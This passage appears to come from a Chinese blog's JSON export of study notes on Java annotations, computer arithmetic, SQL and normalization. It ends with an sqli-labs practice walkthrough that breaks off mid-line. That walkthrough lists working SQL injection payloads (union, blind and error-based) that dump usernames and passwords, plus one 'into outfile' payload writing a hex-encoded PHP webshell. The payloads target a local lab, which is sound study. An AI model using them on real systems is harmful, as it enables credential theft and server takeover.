中预定义的一些注解\n\n@Override：监测点被该注解标注的方法是否是继承自父类（接口）的\n@Depreciated：该注解标注的内容已过时，\n@SuppressWarnings：压制警告 ——@SuppressWarnings (“all”)，一般传 all，写在类上\n\n# 3.2 自定义注解\n\n\n格式：\n\n元注解\npublic @interface 注解名称 {属性列表}\n\n\n\n本质：注解本质上就是一个接口，该接口默认继承 Annotation 接口\n\npublic interface MyAnno extends java.lang.annotation.Annotation{}\n\n\n\njava 反编译命令：javap java.class 文件\n\n\n属性：接口中可以定义的一成员方法\n\n\n要求：\n\n\n属性的返回值类型有下列取值，其他不行\n\n\n基本数据类型（void 不行）\n\n\nString\n\n\n枚举\n\n\n注解\n\n\n以上类型的数组\n\n\n\n\n定义了属性，在使用时需要给属性赋值\n\n\n如果定义属性时，使用 default 关键字给属性默认初始化值，则使用注解时可以不进行属性的赋值\n\n\n如果只有一个属性需要赋值，并且属性的名称是 value，则 value 可以省略，直接定义值即可\n定义：String name () default “张三”;\t使用：@MyAnno (name = “李四”);\n\n\n数组赋值时值使用大括号包裹。如果数组中只有一个值，则大括号可以省略\n\n\n\n\n\n\n\n\n元注解：用于描述注解的注解\n\n@Target：描述注解能够作用的位置\n\nElementType 取值：\n\nTYPE: 可以作用于类上\nMETHOD: 可以作用于方法上\nFIELD: 可以作用于成员变量上\n\n\n\n\n@Retention：描述注解被保留的阶段\n\n@Retention (RetentionPolicy.RUNTIME)：当前被描述的注解会保留到 class 字节码文件中并被 JVM 读取到\n\n\n@Documented：描述注解是否被抽取到 API 文档中\n@Inherited：描述注解是否被类的子类继承\n\n\n\npackage cn.itclass.annocation;\n\nimport java.lang.annotation.*;\n\n/**\n * 元注解：用于描述注解的注解\n     - @Target：描述注解能够作用的位置\n     - @Retention：描述注解被保留的阶段\n     - @Documented：描述注解是否被抽取到API文档中\n     - @Inherited：描述注解是否被子类继承\n */\n@Target(value = &#123;ElementType.TYPE,ElementType.METHOD&#125;)//表示该MyAnno3只能作用于类上\n@Retention(RetentionPolicy.RUNTIME)\n@Documented\n@Inherited\npublic @interface MyAnno3 &#123;\n&#125;\n# 3.3 在程序中使用（解析）注解：获取注解中定义的属性值\n\n获取注解定义的位置的对象\tClass/Method/Field 对象\n获取指定的注解\n\ngetAnnotation(Class)\n这行命令执行后其实就是在内存中生成了一个该注解接口的子类实现对象\n\n\n调用注解中的抽象方法来获取配置的属性值\n\npackage cn.itclass.annocation;\n\nimport java.io.IOException;\nimport java.lang.reflect.InvocationTargetException;\nimport java.lang.reflect.Method;\n\n/**\n * 假设的框架类\n */\n@Pro(className = \"cn.itclass.annocation.Demo1\",methodName = \"show\")\npublic class ReflectTest &#123;\n    public static void main(String[] args) throws IOException, ClassNotFoundException, InstantiationException, IllegalAccessException, NoSuchMethodException, InvocationTargetException &#123;\n        //可以创建任意类的对象，可以执行任意方法\n\n        /**\n         前提：不能改变该类的任何代码，可以创建任意类的对象，可以执行任意方法\n         */\n        //1.解析注解\n        //1.1获取该类的字节码文件对象\n        Class&lt;ReflectTest> reflectTestClass = ReflectTest.class;\n        //2.获取上边的注释对象\n        //其实就是在内存中生成了一个该注解接口的子类实现对象\n        Pro annotation = reflectTestClass.getAnnotation(Pro.class);\n        //3.调用注解对象中定义的抽象方法，获取返回值\n        String className = annotation.className();\n        String methodName = annotation.methodName();\n        System.out.println(className);\n        System.out.println(methodName);\n\n        //下面与reflect一样\n        Class&lt;?> aClass = Class.forName(className);\n        Object o = aClass.newInstance();\n\n        Method method = aClass.getMethod(\"show\");\n        method.invoke(o);\n    &#125;\n&#125;\npackage cn.itclass.annocation;\n\nimport java.lang.annotation.ElementType;\nimport java.lang.annotation.Retention;\nimport java.lang.annotation.RetentionPolicy;\nimport java.lang.annotation.Target;\n\n/**\n * 描述需要去执行的类名，和方法名\n */\n@Target(ElementType.TYPE)\n@Retention(RetentionPolicy.RUNTIME)\npublic @interface Pro &#123;\n    String className();\n    String methodName();\n&#125;\n# 3.4 小结\n\n以后大多数时候会使用注解，而不是自定义注解\n注解给谁用？\n\n编译器\n给解析程序用\n\n\n注解不是程序的一部分，可以理解为注解就是一个标签\n\n","slug":"junit、注解、反射","date":"2022-06-19T12:28:37.000Z","categories_index":"JavaWeb","tags_index":"JavaWeb","author_index":"cCor4ng3"},{"id":"460b9e3a35727b706e187bd7c49b4015","title":"计算机组成原理-数据的表示和运算-2","content":"# 移位运算\n\n# 算数移位\n\n\n移动小数点相当于改变每个位的位权\n移位：通过改变各个数码位和小数点的相对位置，从而改变各个数码位的位权。可以用移位运算实现乘法、除法\n\n# 原码的算数移位\n原码的算数移位：符号位保持不变，仅对数值位进行移位\n右移：高位补 0，低位舍弃，若舍弃的位等于 0，则相当于除以 2，若舍弃的位不等于 0，则会丢失精度\n\n左移：低位补 0，高位舍弃，若舍弃的位等于 0，则相当于 ×2，若舍弃的位不等于 0，则会出现严重误差\n\n原码表示的定点小数与定点整数一个效果\n# 反码的算数移位\n正数的反码移位：正数的反码与原码的表示一模一样，因此正数不论是左移还是右移，表示方法都与原码一样\n负数的反码移位\n\n反码尾数部分和原码是完全相反的，\n右移：高位补 1，低位舍弃\n左移：低位补 1，高位舍弃\n\n# 补码的算数移位\n正数的补码移位：正数的补码与原码的表示一模一样，因此正数不论是左移还是右移，表示方法都与原码一样\n负数的补码移位\n\n补码是从反码的基础上末位 + 1 得到的\n补码的规律为：从右往左到第一个 1 为止，后半部分与原码相同，前半部分和反码相同\n\n\n\n右移：高位补 1，低位舍弃\n左移：低位补 0，高位舍弃\n\n# 算数移位总结\n\n# 算数移位的应用举例\n\n\n# 循环移位\n在循环移位的时候整个二进制字符串是进行循环补位的\n\n循环左移\n带进位位的循环左移\n\n\n\n循环移位的操作很适合把一个数字的低字节和高字节进行调换\n# 知识点回顾\n\n# 定点数原码乘法运算\n\n手算乘法（十进制）\n\n手算乘法（二进制）\n\n考虑用及其实现：\n\n实际数字有正负，符号位如何处理？\n乘积的位数扩大一倍，如何处理？\n4 个位积都要保存下来最后统一相加？\n\n# 原码一位乘法\n符号位单独处理：符号位等于 x 的符号位异或 y 的符号位\n数值位取绝对值进行乘法计算\n\n\nMQ 存放乘数和积的低位\nX 里存放被乘数\nACC 存放乘积高位\n如果 MQ 的最低位为 1，ACC 就加上 X 中的值，如果 MQ 的最低位为 0，就不进行相加\n相加结束之后 ACC 和 MQ 整体右移一位，循环上述操作\n乘数的符号位不用参与运算\n小数点隐含在积的符号位的右边\n\n\n# 原码一位乘法（手算模拟）\n\n原码整数的乘法与小数的运算方法是一致的，注意一下小数点的位置即可\n# 定点数补码的乘法运算\n# 补码的一位乘法\n设机器字长为 5 位（含符号位，n=4），x=-0.1101, y=+0.1011，采用 Booth 算法求 x・y\n原码一位乘法\n\n进行 n 轮加法、移位\n每轮可能加 x 绝对值，可能加 0，具体要看 MQ 的最低位的值\n每次移位是 “逻辑右移”\n符号位不参与运算\n\n补码一位乘法\n\n进行 n 论加法、移位，最后再多来一次加法\n可能加 0，可能加 [x] 补，可能加 [-x] 补，根据当前 MQ 的最低位和辅助位来确定加什么\n\n辅助位 - MQ 中最低位 = 1 时，(ACC)+[X] 补\n辅助位 - MQ 中最低位 = 0 时，(ACC)+0\n辅助位 - MQ 中最低位 =-1 时，(ACC)+[-X] 补\n\n\n每次移位是 “补码的算数右移”—— 算数右移：符号位保持不动，数字右移\n符号位参与运算\n\n补码的一位乘法（手算模拟）\nMQ 需要多一位做辅助位，辅助位初始为 0，每次右移会使 MQ 的最低位顶替原本的辅助位，随之 ACC 和 X 都是双符号位\n\n# 定点数原码除法运算\n\n# 手算除法（十进制）\n\n手算除法（二进制）\n\n# 原码除法：恢复余数法\n符号位单独处理：被除数和除数的符号位异或\n数值拉取绝对值进行除法计算\n写出 x,y 的原码，y 的补码，[-y] 补\n\n\n每次上商的时候默认会商 1，然后会把 ACC 和通用寄存器的值相减后的结果再放回 ACC 中（(ACC)+[-y] 补），如果减法运算之后符号位为 1，说明此时余数小于除数，应该商 0 的，之后计算机再将上商的值改为 0，这时 ACC 的值已经放了之前的负数，要在返回原样，就要再加上除数 [y] 补，再次覆盖 ACC\n\n\n把 ACC 和 MQ 的内容全部左移一位，进行一个错位，重复上述步骤\n\n\n\n小数点默认在第一个 0 后面，余数 = 0.0111X2^{-n}，n=4\n# 原码除法：恢复余数法（手算）\n\n# 原码除法：加减交替法（不恢复余数法）\n\n\n思路：上商为 1 相减之后出现负数直接上商 0，然后逻辑左移，加 y 补\n# 定点数补码除法运算\n# 补码除法：加减交替法\n\n符号位直接参与运算，因此不用写绝对值的补码，直接写原数的补码\n采用双符号位\n被除数和除数同号，则被除数减去除数；异号则被除数加上除数\n余数和除数同号，商 1，余数左移一位减去除数\n余数和除数异号，商 0，余数左移一位加上除数\n重复 n 次\n\n\n末位商恒置为 1\n# 除法运算总结回顾\n\n# C 语言类型转换\nC 语言中的定点整数，如 int short long 都是用补码存储的\nunsigned 表示无符号整数\n\n# 数据的存储和排列\n# 大小端模式\n\n大端：将高有效字节放在低地址，适合人类阅读\n小端：将高有效字节放在高地址，适合机器处理\n# 边界对齐\n\n转换地址就逻辑左移右移即可，每次访存只能读取一个字，且不能跨行读取\n# 浮点数的表示\n\n定点数的局限性：当所需表示的数值较大时，定点数就不能正确表示\n定点数可表示的数字范围有限，但我们不能无限制地增加数据的长度\n科学计数法：+11+3.026\n\n尾数部分越短能表示的精度就越低，阶码表示对应进制的多少次方\n\n阶码反映数值的大小，尾数反映精度\n\n# 浮点数的表示\n\n\nr: 进制，E：阶码；M：尾数\n\n# 浮点数尾数的规格化\n尾数的最高位如果是 0 就没有意义，是无效值，会丧失精度\n左规：当浮点数运算的结果为非规格化时要进行规格化处理，将尾数算数左移一位，阶码减 1\n\n右规：当浮点数运算结果的尾数出现溢出（双符号位为 01 或 10,）时，将尾数算数右移一位，阶码加 1\n\n注：采用双符号位，当溢出发生时，可以挽救。更高的符号位是正确符号位\n# 规格化浮点数的特点\n\n\n# 浮点数标准 IEEE 754\n","slug":"计算机组成原理-数据的表示和运算-2","date":"2022-06-12T00:58:10.000Z","categories_index":"计算机组成原理","tags_index":"计算机组成原理,408","author_index":"cCor4ng3"},{"id":"02e7efbd219a0c25e416f110675eb1a9","title":"计算机组成原理-数据的表示和运算","content":"# 无符号整数的表示和运算\n# 无符号整数的加法\n按位相加\n# 无符号整数的减法\n\n被减数不变，减数全部按位取反，末位 + 1，减法变加法\n从最低位开始，按位相加，并往更高位进位\n\n# 带符号整数的表示和运算 - 原反补\n# 补码的加法运算\n当负数参与加法运算时，要将两个数全部取补码，符号位也参与运算，不需要单独处理\n# 补码的减法运算\n[A]补−[B]补=[A]补+[−B]补[A]_补-[B]_补=[A]_补+[-B]_补[A]补​−[B]补​=[A]补​+[−B]补​\n[B]补[B]_补[B]补​转[−B]补[-B]_补[−B]补​：全部位按位取反（包括符号位），末位加 1\n\n或者：找第一个 1，左边全部取反，右边不变\n例 1：19-19\n\nC 语言中 int 等带符号整数是用补码来表示的\n# 原 / 反 / 补码特性对比\n小题常见考点\n\n\n原码和反码的合法表示范围完全相同，都有两种方法表示真值 0；\n补码的合法表示范围比原码多一个负数，只有一种方式表示真值 0：\n\n如果有 8 个比特，原码和反码能够表示 - 127~127，补码可以表示 - 128~127\n补码中 - 128 的表示为：1,0000000；\n原码能表示的最小的值 - 127：1,1111111；\n-128 不能转为 - 127\n补码的真值 0 表示方法：0,0000000\n\n常见考点：A 和 B 进行某种运算后，是否发生溢出 —— 手算做题可以带入十进制验证是否超出合法范围\n# 移码表示\n\n移码：在补码的基础上符号位取反就是移码，移码只能用来表示整数\n移码的合法表示范围和补码相同，也只能有一种表示真值 0 的形式，[0] 移 = 10000000\n\n\n# 定点小数的表示和运算\n定点：小数点的符号固定\n\n# 定点小数反码、补码的转换\n\n# 定点小数的加 / 减运算\n\n# 定点小数与定点整数的区别\n\n定点小数在位数扩展时，拓展位置不一样，要加在右边\n定点小数带符号与不带符号的加法减法与定点整数一样\n# 奇偶校验码\n\n\n# 算术逻辑单元 ALU\n\n\n算术运算：加减乘除等\n逻辑运算：与或非异或等\n辅助功能：移位、求补等\n\n\n# 最基本的逻辑运算\n\n在一个复杂的逻辑表达式中，与运算的优先级大于或运算的优先级 —— 类比乘法和加法，先算与再算减，且与或运算也符合下面规律\n\nA (C+D) = AC + AD —— 分配率\nABC = A (BC) —— 结合律\nA + B + C = A + (B + C) —— 结合律\n\n\n本质上逻辑表达式是对电路的数学描述，简化逻辑表达式就是在简化电路设计\n# 复合逻辑\n\n与非就是先与再非，或非就是先或再非\n反演律：\n\nA 或 B 的非等于 A 的非与 B 的非\nA 与 B 的非等于 A 的非或 B 的非\n\n同或 ： 异或取反\n\n# 用门电路求偶校验位\n\n# 一位全加器\n\n# 串行加法器\n\n# 串行进位的并行加法器\n\n串行进位又称为行波进位，每一级进位直接依赖于前一级的进位，级进位信号是逐级形成的\n\n# 并行进位加法器\n以上的串行进位的并行加法器，下一位的结果都依赖于上一位 C 的输出，只有上一位的运算结果出来以后下一位才能进行运算，运算速度还是受进位信息产生速度的影响。\n每个进位产生的逻辑表达式:Ci=AiBi+(Ai⨁Bi)Ci−1C_i = A_iB_i + (A_i \\bigoplus B_i )C_{i-1}Ci​=Ai​Bi​+(Ai​⨁Bi​)Ci−1​，依赖于两个本位的数值和来自低位的进位，Ci-1 可以继续进行展开\n\n\n这种加法器的设计每个位的进位几乎是同时产生的\n不足：位数越多电路表达式会越复杂，一般最高到 4 位加 4 位的运算\n# 补码加减运算器\n加法器原理\n\n补码加 / 减法运算\n\nn bit 补码 X+Y，按位相加即可\nn bit 补码 X-Y：将补码 Y 全部按位取反，末位 + 1，得到 [-Y] 补，减法变加法\n\n\n无符号整数的加 / 减法也可以用该电路实现\n\n无符号数 X+Y，按位相加即可\n无符号整数 X-Y，将 Y 全部按位取反，末位 + 1，减法变加法\n\n补码加减运算和无符数的加减运算都可以用同一个运算器实现，但是溢出位的判断不同\n所以底层的硬件都是同一套逻辑，不管给的数是有符号还是无符号，因此溢出判断要进行处理\n# 标志位的生成\n\n加法器输出四个标志位的信息\n\nOF：溢出标志，只在有符号数的加减运算时有效（无符号运算时即使 OF=1，也不能说明发生了溢出）\n\nOF 的硬件逻辑：OF = 最高位的进位异或次高位的进位\n在有符号整数的运算中，如果发生了溢出，可以判断这个运算结果是错误的\n\nSF：符号标志，运算结果为正则置为 0，结果为负则置为 1\n\nSF 的硬件计算方法：SF = 最高位的本位和\nSF 位对无符号数的加减法无意义\n\nZF：零标志，运算结果为 0 时 ZF 置为 1，否则为 0\n\n对有符号数和无符号数都有意义\n\nCF：进位 / 错位标志，进位 / 错位时置 1，否则置 0\n\nCF 表示无符号数的加减法是否发生了进位或错位，只对无符号数有意义，对有符号数无意义\n\n\n\n产生借位意思为被减数不够减，要向上一位借一位，所以发生 CF 时结果是错误的，就是产生了溢出\n\n有符号整数加减运算是否产生了溢出要看 OF 位，无符号整数加减运算是否产生溢出要看 CF 位\n","slug":"计算机组成原理-数据的表示和运算","date":"2022-06-11T03:21:41.000Z","categories_index":"计算机组成原理","tags_index":"计算机组成原理,408","author_index":"cCor4ng3"},{"id":"6b01e0a1bee5e460cbe53bebb203270e","title":"数据库-关系数据库标准语言SQL","content":"# 3.3 数据定义\n# 3.3.1 模式的定义与删除\n# 1. 定义模式\ncreate schema &lt;模式名> authorization &lt;用户名>\n例 3.1：为用户 WANG 定义一个学生 - 课程模式 S-T\ncreate schema \"S-T\" authorization WANG;\n# 2. 删除模式\ndrop schema &lt;模式名> &lt;cascade|restrict>\n# 3.3.2 基本表的定义、删除与修改\n# 1. 定义基本表\n例 3.5：建立一个学生表 Student\ncreate table student(\n    sco char(9) primary key,\n    sname char(20) unique,\n    ssex char(2),\n    sage smallint,\n    sdept char(20)\n);\n# 2. 数据类型\n# 3. 模式与表\n# 4. 修改基本表\n例 3.8：向 Student 表增加” 入学时间 “列，其数据类型为日期型\nalter table Student add S_entrance DATE;\n例 3.9：将年龄的数据类型由字符型（假设原来的数据类型是字符型）改为整数\nalter table Student alter column Sage INT;\n例 3.10：增加课程名称必须取唯一值的约束条件\nalter table Student add unique(Cname);\n# 5. 删除基本表\n例 3.11：删除 Student 表\ndrop table Student cascade;\n# 3.3.3 索引的建立与删除\n# 1. 建立索引\n在 SQL 语言中，建立索引使用 CREATE INDEX 语句，其一般格式为：\nCREATE [UNIQUE][CLUSTER] INDEX 索引名 ON &lt;表名&gt;(&lt;列名&gt;[&lt;次序&gt;])\n例 3.13：为学生 - 课程数据库中的 Student、Course 和 SC 三个表建立索引。其中 Student 表按学号升序建唯一索引，Course 表按课程号升序建唯一索引，SC 表按学号升序和课程号降序建唯一索引。\ncreate unique index stusno on student(Sno);\nCREATE UNIQUE INDEX Coucno ON Course(Cno);\nCREATE UNIQUE INDEX SCno ON SC(Sno ASC, Cno DESC);\n# 2. 修改索引\n例 3.14：将 SC 表的 SCno 索引名改为 SCSno\nALTER INDEX SCno RENAME TO SCSno;\n# 3. 删除索引\nDROP INDEX Stusname;\n# 3.4 数据查询\n","slug":"数据库-关系数据库标准语言SQL","date":"2022-06-09T11:13:01.000Z","categories_index":"数据库","tags_index":"数据库","author_index":"cCor4ng3"},{"id":"7c1208209b9fd71ae4c371be24b134d7","title":"数据库-关系数据理论","content":"# 6.1 问题的提出\nR(U,D,DOM,F)：\n\n关系明 R 是符号化的元组语义\nU 为一组属性\nD 为属性组 U 中的属性所来自的域\nDOM 为属性到域的映射\nF 为属性组 U 上的一组数据依赖\n\n第一范式：每一个分量必须是不可分割的数据项\n数据依赖是一个关系内部属性与属性之间的一种约束关系，是通过属性间值的相等与否体现出来的数据间相关联系。其中最重要的是函数依赖和多值依赖。\n函数依赖：比如描述一个学生的关系，可以有学号 (sno)，姓名 (sname)，系名 (sdept) 等几个属性。由于一个学号只对应一个学生，一个学生只在一个系学习。因而当” 学号 “的值确定之后，学生的姓名及所在的系值也就被唯一地确定了。类似的有Sname=f(sno)Sname = f(sno)Sname=f(sno)，Sdept=f(Sno)Sdept = f(Sno)Sdept=f(Sno)，即 sno 函数决定 sname，或者说 sname 函数依赖于 sno。记作Sno→SnameSno \\rightarrow SnameSno→Sname。\n一个学生例子：F=\\\n但是这个关系存在以下的问题：\n\n数据冗余\n\n如一个系的系主任名重复出现\n\n\n更新异常\n插入异常\n删除异常\n\n将这个单一的模式改造如下，分成三个关系模式：\n\nS(Sno,Sdept,Sno→Sdept)S(Sno,Sdept,Sno \\rightarrow Sdept )S(Sno,Sdept,Sno→Sdept)\nSC(Sno,Cno,Grade,(Sno,Cno)→Grade)SC(Sno,Cno,Grade,(Sno,Cno) \\rightarrow Grade)SC(Sno,Cno,Grade,(Sno,Cno)→Grade)\nDEPT(Sdept,Mname,Sdept→Mname)DEPT(Sdept,Mname,Sdept \\rightarrow Mname)DEPT(Sdept,Mname,Sdept→Mname)\n\n# 6.2 规范化\n通常按属性间依赖情况来区分关系规范化程度为第一范式、第二范式、第三范式和第四范式，然后，直观地描述如何将具有不合适性质的关系转换为更合适的形式。\n# 6.2.1 函数依赖\n定义 6.1：设 R (U) 是属性集 U 上的关系模式，X, Y 是 U 的子集。若对于 R (U) 的任意一个可能的关系 r，r 中不可能存在两个元组在 X 上的属性值相等，而在 Y 上的属性值不等，则称 X 函数确定 Y 或 Y 函数依赖于 X，记作X→YX \\rightarrow YX→Y。\n函数依赖和别的数据依赖一样是语义范畴的概念，只能根据语义来确定一个函数依赖。例如，姓名→\\rightarrow→ 年龄这个函数依赖只有在该部门没有同名人的条件下成立。\n下面介绍一些术语和记号：\n\nX→YX \\rightarrow YX→Y，但 Y 不属于 X，则称X→YX \\rightarrow YX→Y 是非平凡的函数依赖。\nX→YX \\rightarrow YX→Y，但 Y 属于 X，则称X→YX \\rightarrow YX→Y 是平凡的函数依赖。对于任一关系模式，平凡函数依赖都是必然成立的，他不反映新的语义。若不特别声明，总是讨论非平凡的函数依赖。\n若X→YX \\rightarrow YX→Y，则称 X 为这个函数依赖的决定属性组，也称为决定因素。\n若X→YX \\rightarrow YX→Y，Y→XY \\rightarrow XY→X，则记作X←→YX \\leftarrow \\rightarrow YX←→Y。\n若 Y 不函数依赖于 X，则记作X→YX \\rightarrow YX→Y，箭头加斜线\n\n定义 6.2：在 R (U) 中，如果X→YX \\rightarrow YX→Y，并且对于 X 的任何一个真子集X′X&#x27;X′，都有X′X&#x27;X′ 不函数依赖于YYY，则称 Y 对 X 完全函数依赖，记作 —&gt;F\n定义 6.3：传递函数依赖\n# 6.2.2 码\n码是关系模式中的一个重要概念。\n定义 6.4：设 K 为 R&lt;U,F&gt; 中的属性或属性集合，若 U 完全依赖于 K，则 K 为 R 的候选码。\n注意 U 是完全依赖于 K，而不是部分依赖于 K。一般地，如果 U 函数依赖于 K，即K→UK \\rightarrow UK→U，则 K 称为超码。候选码是一类特殊的超码，即候选码的超集（如果存在）一定是超码，候选码的任何真子集一定不是超码。\n若候选码多于一个，则选定其中的一个为主码。\n包含在任何一个候选码中的属性称为主属性；不包含在任何候选码中的属性称为非主属性或非码属性。最简单的情况，单个属性是码；最极端的情况，整个属性组是码，称为全码。\n定义 6.5：关系模式 R 中属性或属性组 X 并非 R 的码，但 X 是另一个关系模式的码，则称 X 是 R 的外部码，也称外码。\n# 6.2.3 范式\n关系数据库中的关系是要满足一定的要求的，满足不同程度要求的为不同范式。\n一个低一级范式的关系模式通过模式分解可以转换为若干个高一级范式的关系模式的集合，这种过程就叫规范化。\n# 6.2.4 2NF\n定义 6.6：若R∈1NFR\\in 1NFR∈1NF，且每一个非主属性完全函数依赖于任何一个候选码，则R∈2NFR\\in 2NFR∈2NF。\n# 6.3 数据依赖的公理系统\n定义 6.11：对于满足一组函数依赖 F 的关系模式 R&lt;U,F&gt;，其任何一个关系 r，若函数依赖X→YX \\rightarrow YX→Y 都成立（即 r 中任意两元祖 t、s，若 t [X]=s [X]，则 t [X]=s [Y]），则称 F 逻辑蕴含X→YX \\rightarrow YX→Y.\n公理系统设 U 为属性集总体，F 是 U 上的一组函数依赖，于是有关系模式 R&lt;U,F&gt;，对 R&lt;U,F &gt; 来说有以下的推理规则：\n\nA1 自反律\nA2 增广率\nA3 传递率\n\n定义 6.13：设 F 为属性集 U 上的一组函数依赖，X、Y⊆\\subseteq⊆U，XF+={A∣X→A能由F根据Armstrong公理导出}X^+_{F}=\\{A|X \\rightarrow A 能由F根据Armstrong 公理导出\\}XF+​={A∣X→A能由F根据Armstrong公理导出}，XF+X^+_FXF+​ 称为属性集 X 关于函数依赖集 F 的闭包。\n","slug":"数据库-关系数据理论","date":"2022-06-08T13:12:23.000Z","categories_index":"数据库","tags_index":"数据库","author_index":"cCor4ng3"},{"id":"1b32940dd409c0fe09232e5ee728ee0b","title":"sqli-labs笔记","content":"测试上线使用\n注意点：PHP 要使用低版本，高版本无法安装\thttps://github.com/Audi-1/sqli-labs\n# 相关知识点\n\n\n\n\n\n\n\n\n\n信息收集知识点：\n数据库版本：version ()\t 5.7.22-0ubuntu0.16.04.1\n数据库用户：user ()\t\t root@localhost\n数据库名字：database ()\t mozhe_Discuz_StormGroup\n操作系统：@@version_compile_os\t Linux\n版本问题：5.1 以上是高版本，5 以下是低版本  （高版本和低版本的区别在于高版本有 information_schema，低版本没有）\n\n\n\n\n\n\n\n\n\n读写文件操作 (mysql 特有功能)\nload_file (): 文件读取函数\ninto outfile 或 into dumpfile：导出函数\n使用条件：secure_file_priv 为空（为空不是为 null），开启方法：在配置文件中添加\n# less 01\n\n经过测试，闭合符号为单引号，注释使用 &quot;–+&quot;\n\n\n\n但是不知道为什么在通过 order 判断字段数的时候 #注释会有问题，用–+ 注释没有问题\n\n\n\n判断出字段共有三列，判断回显位置\n\n\n\n查询数据库和当前用户名\n\n\n\n以下为 payload，依次使用即可\n\nhttp://127.0.0.1/sqli-labs/Less-1/?id=-1' union select 1,group_concat(table_name),database() from information_schema.tables where table_schema = \"security\"--+ #爆破表名\nhttp://127.0.0.1/sqli-labs/Less-1/?id=-1' union select 1,group_concat(column_name),database() from information_schema.columns where table_name = \"users\" and table_schema = \"security\"--+ #爆破列名\nhttp://127.0.0.1/sqli-labs/Less-1/?id=-1' union select 1,group_concat(username),group_concat(password) from users--+ #爆破数据\n\n# less 02\n\nless 02 经测试为无引号包裹\n\n\n\n测试字段数\n\n\n\n信息收集\n\n\n\npayload\n\nhttp://127.0.0.1/sqli-labs/Less-2/?id=-1 union select 1,group_concat(table_name),user() from information_schema.tables where table_schema=\"security\"#  #获取表名\nhttp://127.0.0.1/sqli-labs/Less-2/?id=-1 union select 1,group_concat(column_name),user() from information_schema.columns where table_name=\"users\" and table_schema=\"security\"# #获取字段\nhttp://127.0.0.1/sqli-labs/Less-2/?id=-1 union select 1,group_concat(username),group_concat(password) from users# #获取数据\n\n# less 03\n\n判断闭合方式为双引号\n\n\n\n确定字段数时出现问题，发现后面有一个括号\n\n\n\n经过尝试发现 id 的闭合方法应该为’)，注意注释方法要多试几次，不知道抽什么疯，payload:   ?id=1') order by 4-+\n\n\n\n判断回显位置\n\n\n\npayload：\n\nhttp://127.0.0.1/sqli-labs/Less-3/?id=-1') union select 1,database(),user()--+ #信息收集\nhttp://127.0.0.1/sqli-labs/Less-3/?id=-1') union select 1,group_concat(table_name),user() from information_schema.tables where table_schema = \"security\"--+ #查表\nhttp://127.0.0.1/sqli-labs/Less-3/?id=-1') union select 1,group_concat(column_name),user() from information_schema.columns where table_name = \"users\" and table_schema = \"security\"--+ #获取字段名\nhttp://127.0.0.1/sqli-labs/Less-3/?id=-1') union select 1,group_concat(username),group_concat(password) from users--+ #数据\n\n# less 04\n\n测试注入点，发现这里还是有一个括号干扰\n\n\n\n最终发现注入点的 payload 为： http://127.0.0.1/sqli-labs/Less-4/?id=1&quot;) and 1=1--+\n\n\n\n判断字段数\n\n\n\n判断回显位置\n\n\n\npayload：\n\nhttp://127.0.0.1/sqli-labs/Less-4/?id=-1\") union select 1,database(),user()--+ #信息收集\nhttp://127.0.0.1/sqli-labs/Less-4/?id=-1\") union select 1,group_concat(table_name),user() from information_schema.tables where table_schema=\"security\"--+ #获取表名\nhttp://127.0.0.1/sqli-labs/Less-4/?id=-1\") union select 1,group_concat(column_name),user() from information_schema.columns where table_name=\"users\" and table_schema=\"security\"--+ #获取列名\nhttp://127.0.0.1/sqli-labs/Less-4/?id=-1\") union select 1,group_concat(username),group_concat(password) from users--+ #获取数据\n\n# less 05\n# 1、布尔盲注 —— 使用 left 进行尝试\n\n利用 left 函数判断数据库版本。下面语句是判断版本的第一个字符是否是 5，发现正常返回结果，如果结果不正常是不能返回 you are in 的\n\nhttp://127.0.0.1/sqli-labs/Less-5/?id=1' and left(version(),1)=5--+\n\n\n使用 length 函数判断数据库名称的长度，发现到 8 时正常返回，说明数据库名称的长度为 8\n\nhttp://127.0.0.1/sqli-labs/Less-5/?id=1' and length(database())=8--+\n\n\n使用 left 函数猜测数据库第一位，当试到 s 时正确显示，说明数据库名称的第一位是 s，继续测试出第二位是 e\n\nhttp://127.0.0.1/sqli-labs/Less-5/?id=1' and left(database(),1)=\"s\"--+\nhttp://127.0.0.1/sqli-labs/Less-5/?id=1' and left(database(),2)=\"se\"--+\nhttp://127.0.0.1/sqli-labs/Less-5/?id=1' and left(database(),2)>\"se\"--+ #使用ascii的值对字符进行判断\n\n# 2、报错注入\n\npayload 如下，使用 updatexml 函数\n\n#获取当前数据库名称\nhttp://192.168.101.16/sqli-labs-master/Less-5/?id=1'and updatexml(1,concat(0x7e,(select database()),0x7e),1)--+\n#获取当前数据库所有表名称\nhttp://192.168.101.16/sqli-labs-master/Less-5/?id=1'and updatexml(1,concat(0x7e,substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,31),0x7e),1)--+\n#获取当前数据库user表所有列名称\nhttp://192.168.101.16/sqli-labs-master/Less-5/?id=1'and updatexml(1,concat(0x7e,substr((select group_concat(column_name) from information_schema.columns where table_name='users' and table_schema=database()),1,31),0x7e),1)--+\n#获取当前数据库user表所有username和password的值\nhttp://192.168.101.16/sqli-labs-master/Less-5/?id=1'and updatexml(1,concat(0x7e,substr((select group_concat(concat(username,'^',password)) from users),1,31),0x7e),1)--+\nhttp://192.168.101.16/sqli-labs-master/Less-5/?id=1'and updatexml(1,concat(0x7e,substr((select group_concat(concat(username,'^',password)) from users),32,31),0x7e),1)--+\nhttp://192.168.101.16/sqli-labs-master/Less-5/?id=1'and updatexml(1,concat(0x7e,substr((select group_concat(concat(username,'^',password)) from users),63,31),0x7e),1)--+\nhttp://192.168.101.16/sqli-labs-master/Less-5/?id=1'and updatexml(1,concat(0x7e,substr((select group_concat(concat(username,'^',password)) from users),94,31),0x7e),1)--+\nhttp://192.168.101.16/sqli-labs-master/Less-5/?id=1'and updatexml(1,concat(0x7e,substr((select group_concat(concat(username,'^',password)) from users),125,31),0x7e),1)--+\nhttp://192.168.101.16/sqli-labs-master/Less-5/?id=1'and updatexml(1,concat(0x7e,substr((select group_concat(concat(username,'^',password)) from users),156,31),0x7e),1)--+\nhttp://192.168.101.16/sqli-labs-master/Less-5/?id=1'and updatexml(1,concat(0x7e,substr((select group_concat(concat(username,'^',password)) from users),187,31),0x7e),1)--+\n#下面这步写webshell\nhttp://192.168.101.16/sqli-labs-master/Less-5/?id=1' into outfile 'C:/less5.php' lines terminated by 0x3c3f7068702061737365727428245f504f53545b6c657373355d293b3f3e--+\n \n\n本关为无回显注入\n\n\n\n判断闭合方式为单引号\n\n\n\n获取数据库\n\nhttp://127.0.0.1/sqli-labs/Less-5/?id=1'and(select extractvalue(1,concat(0x7e,(select database()))))--+\n\n\n获取表名\n\nhttp://127.0.0.1/sqli-labs/Less-5/?id=1'and(select 